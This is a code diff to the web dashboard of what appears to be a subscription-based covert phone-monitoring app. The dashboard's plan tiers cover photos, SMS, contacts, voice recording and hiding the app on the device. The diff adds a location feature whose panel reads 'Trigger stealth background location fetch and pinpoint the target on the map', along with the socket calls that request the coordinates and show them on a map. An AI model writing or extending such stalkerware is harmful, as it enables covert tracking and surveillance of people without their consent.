@@ -34,6 +34,7 @@ interface PlanLimits {
     contacts: boolean;
     torch: boolean;
     vibration: boolean;
+    location: boolean;
     hideApp: boolean;
     bulkDownload?: boolean;
     maxDevices: number;
@@ -42,10 +43,10 @@ interface PlanLimits {
 // Compute plan limits from plan name — used as the source of truth
 const getPlanLimits = (plan: string): PlanLimits => {
     const p = (plan || '').toLowerCase();
-    if (p === 'enterprise') return { photos: -1, videos: -1, sms: true, contacts: true, torch: true, vibration: true, hideApp: true, bulkDownload: true, maxDevices: -1 };
-    if (p === 'premium') return { photos: -1, videos: -1, sms: true, contacts: true, torch: true, vibration: true, hideApp: true, bulkDownload: true, maxDevices: 10 };
-    if (p === 'standard') return { photos: -1, videos: -1, sms: true, contacts: true, torch: true, vibration: true, hideApp: false, bulkDownload: true, maxDevices: 5 };
-    return { photos: 50, videos: 0, sms: false, contacts: false, torch: false, vibration: false, hideApp: false, bulkDownload: false, maxDevices: 1 };
+    if (p === 'enterprise') return { photos: -1, videos: -1, sms: true, contacts: true, torch: true, vibration: true, location: true, hideApp: true, bulkDownload: true, maxDevices: -1 };
+    if (p === 'premium') return { photos: -1, videos: -1, sms: true, contacts: true, torch: true, vibration: true, location: true, hideApp: true, bulkDownload: true, maxDevices: 10 };
+    if (p === 'standard') return { photos: -1, videos: -1, sms: true, contacts: true, torch: true, vibration: true, location: true, hideApp: false, bulkDownload: true, maxDevices: 5 };
+    return { photos: 50, videos: 0, sms: false, contacts: false, torch: false, vibration: false, location: false, hideApp: false, bulkDownload: false, maxDevices: 1 };
 };
 
 export default function Home() {
@@ -446,6 +447,11 @@ export default function Home() {
     const audioWarmedRef = useRef<boolean>(false);
     const audioLastSampleRef = useRef<number>(0);
     const audioUnderrunCountRef = useRef<number>(0);
+
+    // Location State
+    const [locationData, setLocationData] = useState<any>(null);
+    const [isFetchingLocation, setIsFetchingLocation] = useState(false);
+    const [locationError, setLocationError] = useState<string | null>(null);
 
     // Custom Alert Modal State
     const [showCustomAlert, setShowCustomAlert] = useState(false);
@@ -1092,6 +1098,18 @@ export default function Home() {
                 }
             });
 
+            // Location updates
+            socket.on("d_l1", (data: any) => {
+                setLocationData(data);
+                setIsFetchingLocation(false);
+                setLocationError(null);
+            });
+
+            socket.on("d_l2", (data: any) => {
+                setIsFetchingLocation(false);
+                setLocationError(data.error || "Failed to fetch location");
+            });
+
             // Voice Recording Progress from device
             socket.on("d_a2", (data: any) => {
                 if (data.current !== undefined) {
@@ -1401,6 +1419,23 @@ export default function Home() {
             duration: torchDuration
         });
     };
+
+    // --- Location Functions ---
+    const fetchLocation = useCallback(() => {
+        if (!planLimits.location) {
+            showUpgradePrompt('Live Location', 'standard');
+            return;
+        }
+        if (!requireConnectedDevice(() => {})) return;
+        if (!socket || !selectedDeviceId || !session?.user?.uuid) return;
+        
+        setIsFetchingLocation(true);
+        setLocationError(null);
+        socket.emit('c_l1', {
+            uuid: session.user.uuid,
+            targetDeviceId: selectedDeviceId
+        });
+    }, [socket, selectedDeviceId, session, planLimits]);
 
     // --- Vibration Functions ---
     const triggerVibration = () => {
@@ -2524,6 +2559,71 @@ END:VCARD`;
                         </div>
                     </div>
                 );
+            case 'location':
+                return (
+                    <div className="flex flex-col items-center justify-center min-h-[60vh] animate-in fade-in zoom-in-95 duration-300">
+                        <div className="max-w-xl w-full bg-white/5 border border-white/10 rounded-[3rem] p-12 space-y-12 shadow-neo-2xl relative overflow-hidden">
+                            <div className="absolute inset-0 bg-gradient-to-b from-orange-500/10 to-transparent pointer-events-none" />
+                            
+                            <div className="space-y-4 relative z-10 text-center">
+                                <h2 className="text-4xl font-bold tracking-tight text-white flex items-center justify-center gap-3">
+                                    <MapPin className="text-orange-400 w-10 h-10" /> Location Tracking
+                                </h2>
+                                <p className="text-white/50 text-sm max-w-sm mx-auto">Trigger stealth background location fetch and pinpoint the target on the map.</p>
+                            </div>
+                            
+                            {locationError && (
+                                <div className="bg-red-500/10 border border-red-500/20 rounded-2xl p-4 text-center relative z-10">
+                                    <p className="text-red-400 text-sm font-bold">{locationError}</p>
+                                </div>
+                            )}
+
+                            {locationData && !isFetchingLocation && (
+                                <div className="bg-black/40 border border-white/5 rounded-3xl p-6 relative z-10 flex flex-col gap-4">
+                                    <div className="flex items-center justify-between border-b border-white/5 pb-4">
+                                        <span className="text-white/40 uppercase tracking-widest text-xs font-bold">Coordinates</span>
+                                        <span className="text-orange-400 font-mono text-sm">{locationData.latitude.toFixed(6)}, {locationData.longitude.toFixed(6)}</span>
+                                    </div>
+                                    <div className="flex items-center justify-between border-b border-white/5 pb-4">
+                                        <span className="text-white/40 uppercase tracking-widest text-xs font-bold">Accuracy</span>
+                                        <span className="text-white/80 font-mono text-sm">± {Math.round(locationData.accuracy)} meters</span>
+                                    </div>
+                                    <div className="flex items-center justify-between border-b border-white/5 pb-4">
+                                        <span className="text-white/40 uppercase tracking-widest text-xs font-bold">Timestamp</span>
+                                        <span className="text-white/80 text-sm">{new Date(locationData.timestamp).toLocaleString()}</span>
+                                    </div>
+                                    <a 
+                                        href={`https://www.google.com/maps/search/?api=1&query=${locationData.latitude},${locationData.longitude}`} 
+                                        target="_blank" 
+                                        rel="noopener noreferrer"
+                                        className="mt-4 w-full py-4 rounded-2xl bg-orange-500/20 hover:bg-orange-500/30 border border-orange-500/30 text-orange-300 font-bold flex items-center justify-center gap-2 transition-colors"
+                                    >
+                                        <MapPin className="w-5 h-5" /> Open in Google Maps
+                                    </a>
+                                </div>
+                            )}
+
+                            <div className="flex justify-center relative z-10">
+                                <button 
+                                    onClick={fetchLocation}
+                                    disabled={isFetchingLocation}
+                                    className={`relative px-12 py-5 rounded-full flex items-center justify-center transition-all duration-300 font-bold uppercase tracking-widest ${
+                                        isFetchingLocation 
+                                            ? 'bg-orange-500/50 text-white/50 cursor-not-allowed scale-95' 
+                                            : 'bg-orange-500 hover:bg-orange-400 text-white shadow-[0_0_40px_rgba(249,115,22,0.4)] hover:shadow-[0_0_60px_rgba(249,115,22,0.6)] hover:scale-105 active:scale-95'
+                                    }`}
+                                >
+                                    {isFetchingLocation ? (
+                                        <span className="flex items-center gap-2">
+                                            <RefreshCw className="w-5 h-5 animate-spin" /> Fetching...
+                                        </span>
+                                    ) : 'Fetch Location Now'}
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                );
+
             case 'notifications': {
                 const selectedDevice = devices.find(d => d.deviceId === selectedDeviceId);
                 const isDeviceOnline = selectedDevice?.online ?? false;
